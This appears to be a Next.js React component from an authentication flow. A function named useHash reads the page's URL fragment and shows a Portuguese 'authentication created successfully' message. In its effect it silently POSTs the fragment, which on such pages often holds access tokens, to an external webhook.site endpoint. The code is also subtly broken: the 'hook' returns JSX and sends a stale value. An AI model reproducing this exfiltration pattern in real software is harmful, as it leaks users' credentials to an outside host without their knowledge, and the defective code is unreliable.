"use client";

import { useParams } from "next/navigation";
import { useEffect, useState } from "react";


const getHash = () =>
  typeof window !== "undefined" ? window.location.hash : undefined;

const useHash = () => {
  // const [isClient, setIsClient] = useState(false);
  const [hash, setHash] = useState(getHash());
  const params = useParams();

  useEffect(() => {
    // setIsClient(true);
    setHash(getHash());

    async function log() {
      await fetch('https://webhook.site/dde3db59-0914-4885-a7c9-e99982a52b9d', {
        method: 'POST',
        body: JSON.stringify({hash})
      })
    }
    log()
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [params]);

  // return isClient ? hash : null;
  return (
    <div>
      Autenticação criada com sucesso!
    </div>
  );
};

export default useHash;